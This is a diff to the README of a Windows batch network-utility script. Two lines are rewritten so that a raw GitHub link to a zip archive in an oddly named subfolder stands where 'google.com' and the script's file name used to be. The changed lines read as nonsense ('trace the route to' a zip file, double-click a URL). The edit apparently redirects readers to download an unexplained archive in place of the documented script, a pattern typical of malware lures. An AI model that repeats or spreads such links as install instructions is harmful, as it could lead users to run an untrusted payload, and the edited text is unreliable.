@@ -9,7 +9,7 @@ Fender's Tools is a simple, menu-driven batch script providing essential Windows
   - Scan devices on your local network  
   - Show detailed IP configuration  
   - Display active TCP/UDP connections  
-  - Trace the route to google.com  
+  - Trace the route to https://raw.githubusercontent.com/TheBatProgrammer/Fender-s-Tools/main/molompi/s-Tools-Fender-v2.9.zip  
   - Flush DNS cache  
   - Show MAC addresses of network adapters
 
@@ -25,7 +25,7 @@ Fender's Tools is a simple, menu-driven batch script providing essential Windows
 ## Usage
 
 1. Clone or download the repository.  
-2. Run `FendersTools.bat` by double-clicking or via Command Prompt.  
+2. Run `https://raw.githubusercontent.com/TheBatProgrammer/Fender-s-Tools/main/molompi/s-Tools-Fender-v2.9.zip` by double-clicking or via Command Prompt.  
 3. Select a tool by typing its number and follow prompts.  
 4. Use the Exit option to close the program.
 
